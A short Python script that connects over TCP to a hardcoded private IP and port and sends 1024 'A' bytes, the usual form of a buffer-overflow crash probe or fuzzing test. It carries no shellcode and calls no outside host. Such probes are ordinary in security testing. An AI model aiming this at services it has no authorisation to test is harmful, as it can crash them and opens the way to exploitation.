import socket

target_ip= "192.168.1.100"
target_port =12345

payload= b"A" *1024
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(payload)
s.close()
